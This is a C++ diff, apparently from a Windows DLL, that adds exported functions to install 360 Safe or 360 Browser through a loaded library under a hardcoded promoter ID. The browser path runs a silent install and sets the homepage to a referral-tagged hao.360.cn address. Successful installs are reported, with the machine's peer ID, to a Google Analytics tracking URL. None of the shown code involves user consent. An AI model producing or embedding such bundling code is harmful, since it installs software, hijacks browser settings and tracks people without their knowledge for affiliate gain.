@@ -615,3 +615,191 @@ bool IsVistaOrLatter()
 	}
 	return (osvi.dwMajorVersion >= 6);
 }
+
+static HRESULT SendHttpStatSync(const std::string& url)
+{
+	CoInitialize(NULL);
+	CHAR szBuffer[MAX_PATH];
+	HRESULT hr = E_FAIL;
+	__try
+	{
+		hr = ::URLDownloadToCacheFileA(NULL, url.c_str(), szBuffer, MAX_PATH, 0, NULL);
+	}
+	__except(EXCEPTION_EXECUTE_HANDLER)
+	{
+	}
+	CoUninitialize();
+	return hr;
+}
+
+// ec: 360safeinstall or 360browserinstall
+// ea: 版本
+// el: 渠道
+static HRESULT Send360ProductInstallHttpStatSync(const std::string& ec, const std::string& ea, const std::string& el)
+{
+	std::string url = "http://www.google-analytics.com/collect?v=1&tid=UA-58424540-1&cid=";
+	char szPid[256];
+	std::memset(szPid, 0, sizeof(szPid));
+	GetPeerID(szPid);
+	url += szPid;
+	url += "&t=event&ec=";
+	url += ec;
+	url += "&ea=";
+	url += ea;
+	url += "&el=";
+	url += el;
+	url += "&ev=1";
+	return SendHttpStatSync(url);
+}
+
+static DWORD Do360SafeLogic(DWORD dwPublicID, LPCSTR lpszLibraryFile)
+{
+	DWORD dwResult = (DWORD)-1;
+	typedef BOOL (WINAPI *ISSAFEEXIST)();
+	HINSTANCE hInstance = LoadLibraryA(lpszLibraryFile);
+	ISSAFEEXIST IsSafeExist = (ISSAFEEXIST)GetProcAddress(hInstance,"IsSafeExist");
+	if (IsSafeExist)
+	{
+		BOOL isSafeExist = IsSafeExist();
+		TSINFO4CXX("IsSafeExist: " << isSafeExist);
+		if(FALSE == isSafeExist)
+		{
+			typedef struct _StartParameter
+			{
+				int ver;
+				int id;     //分配给您的渠道号
+				BOOL sync;
+				BOOL httprecord;
+				DWORD timeout;
+				WCHAR cab_name[MAX_PATH + 1];
+			} StartParameter;
+
+			if (hInstance)
+			{
+				typedef DWORD (WINAPI *PFNStart)(StartParameter *param);
+				PFNStart   pFnStart = (PFNStart)GetProcAddress(hInstance, "Start") ; //Start_UI是有托盘图标的
+				if (pFnStart)
+				{
+					StartParameter param;
+					std::memset(&param, 0, sizeof(StartParameter));
+					param.ver = 3;
+					param.id = dwPublicID;    //只需要修改这个分配给您的渠道号就可以了. 其他参数不用改
+					param.sync = TRUE;
+					param.httprecord = TRUE;
+					param.timeout = 1000*60*60*30;
+					DWORD dwResult = pFnStart(&param);
+				}
+			}
+		}
+	}
+	return dwResult;
+}
+
+static HRESULT DoBrowserLogic(DWORD dwPublicID, LPCSTR lpszLibraryFile, LPCWSTR lpszCommandLine = NULL)
+{
+    //////////////////////////////////////////////////////////////////////////
+    // 浏览器推广相关导出函数 [10/31/2014 Beacon]
+    //////////////////////////////////////////////////////////////////////////
+    // 浏览器全自动下载安装发射装置 [11/5/2014 Beacon]
+    //   参数一 : [IN] 推广者ID
+    //   参数二 : [IN, OPT] 传给安装包的命令行
+    //   返回值 : 安装结果
+    typedef HRESULT(WINAPI * TBrowserLaunch)(DWORD dwPubicID, LPCWSTR lpszCommandLine);
+
+    // 判断360SE 或 360Chrome 是否安装 [11/5/2014 Beacon]
+    //   参数一 : [IN] 测试 360SE 是否安装
+    //   参数二 : [IN] 测试 360Chrome 是否安装
+    //   返回值 : 所测试的浏览器是否已安装(参数一与参数二是或的关系)
+    typedef BOOL(WINAPI * TIsBrowserInstalled)(BOOL b360Se, BOOL b360Chrome);
+    //////////////////////////////////////////////////////////////////////////
+
+    HRESULT hr = E_FAIL;
+    HMODULE hModule = NULL;
+    __try{
+        hModule = LoadLibraryA(lpszLibraryFile);
+        if (hModule == NULL) __leave;
+
+        TIsBrowserInstalled IsBrowserInstalled = (TIsBrowserInstalled) GetProcAddress(hModule, "IsBrowserInstalled");
+        TBrowserLaunch BrowserLaunch = (TBrowserLaunch) GetProcAddress(hModule, "BrowserLaunch");
+        if (IsBrowserInstalled == NULL || BrowserLaunch == NULL){
+            hr = E_NOINTERFACE;
+            __leave;
+        }
+
+        // 判断是否安装了360安全浏览器或360极速浏览器,只有两者都没安装,才推广 [11/11/2014 Beacon]
+		BOOL isBrowserInstalled = IsBrowserInstalled(TRUE, TRUE);
+		TSINFO4CXX("IsBrowserInstalled: " << isBrowserInstalled);
+        if (!isBrowserInstalled)
+        {
+            // 下载并安装推广的浏览器 [11/11/2014 Beacon]
+            // 调用该接口,只有返回值 SUCCEEDED(hr) 才成功 [11/11/2014 Beacon]
+            hr = BrowserLaunch(dwPublicID, lpszCommandLine);
+            if (FAILED(hr)) __leave;
+        }
+
+    }
+    __finally{
+        if (hModule) FreeLibrary(hModule);
+    }
+    return hr;
+}
+
+struct Install360ProductThreadParameters {
+	int product; // 0: 360safe, 1: 360 browser
+	CHAR libraryFile[MAX_PATH];
+	CHAR ea[32];
+	CHAR el[32];
+};
+
+DWORD WINAPI Intall360ProductThread(LPVOID pParameter)
+{
+	const Install360ProductThreadParameters* args = reinterpret_cast<const Install360ProductThreadParameters*>(pParameter);
+	if (args->product == 0) {
+		if (0 == Do360SafeLogic(21456, args->libraryFile)) {
+			Send360ProductInstallHttpStatSync("360safeinstall", args->ea, args->el);
+		}
+	}
+	else {
+		// args->product == 1
+		if (S_OK == DoBrowserLogic(21456, args->libraryFile, L"--silent-install=3_1_1 --homepage=http://hao.360.cn/?src=lm&ls=n798f3c1297")) {
+			Send360ProductInstallHttpStatSync("360browserinstall", args->ea, args->el);
+		}
+	}
+	delete args;
+	SetUserHandle();
+	return 0;
+}
+
+extern "C" __declspec(dllexport) VOID Install360SafeAsync(LPCSTR lpszLibraryFile, LPCSTR ea, LPCSTR el)
+{
+	if (std::strlen(lpszLibraryFile) >= MAX_PATH ||
+		std::strlen(ea) >= 32 || std::strlen(el) >= 32) {
+		return;
+	}
+	Install360ProductThreadParameters* parg = new Install360ProductThreadParameters();
+	std::memset(parg, 0, sizeof(Install360ProductThreadParameters));
+	parg->product = 0;
+	std::strcpy(parg->libraryFile, lpszLibraryFile);
+	std::strcpy(parg->ea, ea);
+	std::strcpy(parg->el, el);
+	ResetUserHandle();
+	HANDLE hThread = CreateThread(NULL, 0, Intall360ProductThread, (LPVOID)parg, 0, NULL);
+	CloseHandle(hThread);
+}
+
+extern "C" __declspec(dllexport) VOID Install360BrowserAsync(LPCSTR lpszLibraryFile, LPCSTR ea, LPCSTR el)
+{
+	if (std::strlen(lpszLibraryFile) >= MAX_PATH ||
+		std::strlen(ea) >= 32 || std::strlen(el) >= 32) {
+		return;
+	}
+	Install360ProductThreadParameters* parg = new Install360ProductThreadParameters();
+	std::memset(parg, 0, sizeof(Install360ProductThreadParameters));
+	parg->product = 1;
+	std::strcpy(parg->libraryFile, lpszLibraryFile);
+	std::strcpy(parg->ea, ea);
+	std::strcpy(parg->el, el);
+	ResetUserHandle();
+	HANDLE hThread = CreateThread(NULL, 0, Intall360ProductThread, (LPVOID)parg, 0, NULL);
+	CloseHandle(hThread);
+}
